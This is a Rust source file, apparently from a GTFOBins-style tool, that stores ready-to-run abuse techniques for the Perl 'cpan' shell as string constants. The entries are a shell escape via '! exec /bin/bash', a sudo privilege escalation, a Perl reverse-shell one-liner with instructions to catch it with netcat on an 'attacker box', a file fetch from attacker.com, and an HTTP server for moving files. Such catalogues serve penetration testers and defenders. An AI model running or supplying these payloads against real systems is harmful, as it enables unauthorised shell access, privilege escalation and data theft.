
pub static BIN_NAME: &'static str = "cpan";
pub static SH_DESC: &'static str = "`cpan` lets you execute perl commands with the `! command`.";
pub static SH_CODE: &'static str = r#"
    
    cpan
    ! exec '/bin/bash'
"#;
pub static RS_DESC: &'static str = "Run `nc -lvp RPORT` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=localhost
    export RPORT=9000
    cpan
    ! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};
"#;
pub static FU_DESC: &'static str = "Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.";
pub static FU_CODE: &'static str = r#"
    
    cpan
    ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
"#;
pub static FD_DESC: &'static str =
    "Fetch a remote file via an HTTP GET request and store it in `PWD`.";
pub static FD_CODE: &'static str = r#"
    
    export URL=http://attacker.com/file_to_get
    cpan
    ! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo cpan
    ! exec '/bin/bash'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static RS: Code<'static> = Code { 
	title: "RS_CODE",
	code: RS_CODE,
	tag: Tag::RS,
};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
